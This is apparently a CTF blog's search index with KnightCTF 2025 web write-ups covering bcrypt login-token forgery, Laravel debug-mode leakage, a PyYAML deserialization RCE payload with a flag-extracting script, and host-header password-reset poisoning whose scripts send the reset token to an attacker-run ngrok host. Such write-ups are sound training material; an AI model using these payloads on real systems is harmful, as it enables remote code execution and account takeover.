Python Exploit ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:8:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"💡 Key Learnings ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:9:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:9:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📊 Final Statistics Metric Value Notes Time to Solve 00:04 From start to flag Global Ranking 9/445 Challenge ranking Points Earned 150 Team contribution Created: 20-01-2025 • Last Modified: 20-01-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:10:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Knight Connect' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🌐 Knight Connect Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:0:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event KnightCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 260 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author NomanProdhan Profile 🎮 Solves 49 XX% solve rate 📅 Date 20-01-2025 KnightCTF - 2025 Day X 🦾 Solved By Bebo07 Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:1:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📝 Challenge Information In a realm where ancient knights and modern technology collide, a mysterious portal emerges—known as “Knight Connect.” Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses. Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:2:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:3:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Provided Files Files:  Attached Files ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:3:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔍 Initial Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:4:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"First Steps The site initially appeared as follows: Site Presentation with a login screen. After completing the registration and login, I was redirected to the following page: Home Page I couldn’t find anything else on the site, so I started reading the attached files. At first, I was overwhelmed and didn’t know where to look due to the number of files present. The first thing that came to mind was to forge some session cookies since the APP_KEY of Laravel was in the .env file. Also, because it required the session to be set to is_admin in order to display the flag. We can see this from the following lines of code in the index.blade.php file under the resources/views/users folder: @if (isset($flag) \u0026\u0026 session()-\u003ehas('is_admin') \u0026\u0026 session('is_admin')) \u003cdiv class=\"flag\"\u003eFlag: {{ $flag-\u003eflag }}\u003c/div\u003e @endif but then I discovered that it wasn’t the right path. However, I realized that I needed to get an administrator account to be able to read the flag. In the web.php file under the resources/routes folder, I found all the routes of the site, including one that seemed a bit suspicious: /contact. Visiting it redirected me to the following page: Contact where the administrator accounts and their respective emails were displayed. Spoiler: only one of these was valid, which was nomanprodhan@knightconnect.com (the username of the challenge creator). I then continued looking at other files, but I was interested in how authentication was being handled, so I searched for the authentication file, which was named AuthController.php under the Http/Controllers folder. Here I found the vulnerability—there were two functions that allowed you to request a login link for an account, which created a token formed by combining the email and a timestamp at that moment, all encrypted using the bcrypt function. The other function allowed you to log in using that generated link by passing the token as a parameter: public function requestLoginUrl(Request $request) { $request-\u003evalidate([ 'email' =\u003e 'required|email', ]); $user = User::where('email', $request-\u003eemail)-\u003efirst(); if (!$user) { return back()-\u003ewithErrors(['email' =\u003e 'Email not found']); } $time = time(); $data = $user-\u003eemail . '|' . $time; $token = bcrypt($data); $loginUrl = url('/login-link?token=' . urlencode($token) . '\u0026time=' . $time . '\u0026email=' . urlencode($user-\u003eemail)); return back()-\u003ewith('success', 'Login link generated, but email sending is disabled.'); } public function loginUsingLink(Request $request) { $token = $request-\u003equery('token'); $time = $request-\u003equery('time'); $email = $request-\u003equery('email'); if (!$token || !$time || !$email) { return response('Invalid token or missing parameters', 400); } if (time() - $time \u003e 3600) { return response('Token expired', 401); } $data = $email . '|' . $time; if (!Hash::check($data, $token)) { return response('Token validation failed', 401); } $user = User::where('email', $email)-\u003efirst(); if (!$user) { return response('User not found', 404); } session(['user_id' =\u003e $user-\u003eid]); session(['is_admin' =\u003e $user-\u003eis_admin]); return redirect()-\u003eroute('users'); } the first function doesn’t really have any vulnerabilities, since it only shows how the token is created to request the “instant” login URL. In contrast, the second function has a significant vulnerability, as the only check it does is ensure the timestamp of the generated token is at most one hour old (3600 seconds), otherwise, it becomes invalid. However, we can manipulate the timestamp ourselves by passing a fake value as a parameter. In fact, to make it secure, the generated token with the timestamp should have been saved in the database, and if it wasn’t the exact timestamp, it wouldn’t allow access (although a brute-force attack could be used to try all possible timestamps). So, I realized that it’s possible to forge a token—one just needs to know the email of the account they want to access, and as we saw earlier in the /contact route, there were quite a few admin emails… Now that we’ve figured it all out, let’s proceed with the exploit. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:4:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Potential Vulnerabilities Insecure Authentication ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Solution Path ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:6:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation Steps Initial setup Initially, to generate the URL, I used https://onlinephp.io/. I also found this website useful for generating “passwords” with Laravel’s bcrypt (https://fbutube.com/laravel-password-generator). However, in the end, I decided to write it in PHP and run it locally, as this way I could fully automate the process. Exploitation After obtaining the admin’s email nomanprodhan@knightconnect.com, it was quite simple to forge a token, since it was made up of “email|timestamp”. I then wrote a PHP script that did exactly what the first function did, using bcrypt on the string formed by the admin’s email + timestamp, and then generating a link similar to the one in the function with the parameters token, time, and email. This way, I created a valid login link, since the user associated with the email actually existed. I gained access to their account, and by visiting the homepage as seen earlier, with the is_admin flag on the account, I was able to retrieve the flag. Flag capture Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:6:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🛠️ Exploitation Process ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:7:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Approach I wrote the exploit in PHP because I had issues with token composition using bcrypt in Python. This exploit takes the admin’s email, which has the flag in their profile, and then creates a valid token with a timestamp less than one hour old. It then generates a URL with a valid token to access the admin profile, and through a cURL function in PHP, it makes a request to the page, extracting the flag via a regex. I used the following commands for the requirements and the run: sudo apt install php sudo apt-get install php-curl php exploit.php  Exploit ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:7:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🚩 Flag Capture Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:8:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:8:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔧 Tools Used ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:9:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Primary Tools Tool Purpose PHP Exploit ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:9:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"💡 Key Learnings ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:10:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:10:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📚 References \u0026 Resources ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:11:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Learning Resources https://laravel.com/docs/11.x/hashing ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:11:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📊 Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking 10/451 Challenge ranking Points Earned 260 Team contribution Created: 20-01-2025 • Last Modified: 20-01-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:12:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Exceeding Knight' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/","tags":["Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:1","tags":["Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows: Site Presentation There was nothing interesting here, so I began reading the attached files. The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel’s debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: \u003c?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request-\u003evalidate([ 'num1' =\u003e 'required|numeric', 'num2' =\u003e 'required|numeric', 'operation' =\u003e 'required|in:add,sub,mul,div', ]); $num1 = $request-\u003einput('num1'); $num2 = $request-\u003einput('num2'); $operation = $request-\u003einput('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 \u003e $limit || $num2 \u003e $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' =\u003e $num1 + $num2, 'sub' =\u003e $num1 - $num2, 'mul' =\u003e $num1 * $num2, 'div' =\u003e $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' =\u003e $result]); } } ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:2","tags":["Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception. This caused the detailed error page to return, which contained the flag inside it: Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:3","tags":["Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:4","tags":["Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Baby Injection' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:1","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appears as follows: Site Presentation The first thing that immediately stands out is the site’s URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let’s try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:2","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that’s how I formed the URL for injecting the “ls -al” command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:3","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = \"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:4","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:5","tags":["YAML Insecure Deserialization","Insecure Deserialization","🌐 Web Security"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["About Me"],"content":" Hi, I'm Matteo Maccarone, a passionate computer science enthusiast with a particular interest in cybersecurity. I've always aimed to combine my curiosity with a passion for cybersecurity, approaching every new project with enthusiasm and dedication. ","date":"03/02/2025","objectID":"/about/:0:0","tags":["👤​ About Me"],"title":"About Me","uri":"/about/"},{"categories":["About Me"],"content":"Who Am I I consider myself a very curious person with a strong passion for knowledge. Over the years, I’ve developed skills in programming and cybersecurity. Outside of my work, I enjoy traveling and playing CTF (Capture The Flag), which helps me maintain a balance between creativity and productivity. Check out my CTFtime and TryHackMe profiles: CTFtime TryHackMe Currently a member of the teams: Havce aetruria QnQSec ","date":"03/02/2025","objectID":"/about/:1:0","tags":["👤​ About Me"],"title":"About Me","uri":"/about/"},{"categories":["About Me"],"content":"What I Do I’m currently a university student, and I occasionally try my hand at bug bounty work. In my work, I focus on finding new ways to protect web applications. Every project offers me the opportunity to improve, learn something new, and contribute to the progress of cybersecurity in a meaningful way. In my free time, I also enjoy reading and watching movies or TV series. ","date":"03/02/2025","objectID":"/about/:2:0","tags":["👤​ About Me"],"title":"About Me","uri":"/about/"},{"categories":["About Me"],"content":"My Vision I firmly believe that this world is still full of things to discover. My mission is to become an established penetration tester, contributing positively to the field of cybersecurity. ","date":"03/02/2025","objectID":"/about/:3:0","tags":["👤​ About Me"],"title":"About Me","uri":"/about/"},{"categories":["About Me"],"content":"Contact Me If you want to get in touch or talk about anything, feel free to reach out! You can find the links to my profiles on the homepage. I’d love to hear your thoughts or discuss new opportunities! Thanks for visiting my space! ~ mH4ck3r0n3 ","date":"03/02/2025","objectID":"/about/:4:0","tags":["👤​ About Me"],"title":"About Me","uri":"/about/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Admin Access' from KnightCTF - 2025","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/","tags":["Host Header Injection","Password Reset Poisoning","🌐 Web Security"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows, with a login screen: Site Presentation After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That’s when I realized that registering was pointless. Inspecting the page source, I found a strange comment: Admin Email the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the “Forgot Password” section: Forgot Password Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:1","tags":["Host Header Injection","Password Reset Poisoning","🌐 Web Security"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So i started ngrok on port 80: And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent “Forgot Password” request with the email kctf2025@knightctf.com: Intercept After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password Manual Flag ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:2","tags":["Host Header Injection","Password Reset Poisoning","🌐 Web Security"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 # (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:3","tags":["Host Header Injection","Password Reset Poisoning","🌐 Web Security"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:4","tags":["Host Header Injection","Password Reset Poisoning","🌐 Web Security"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"}]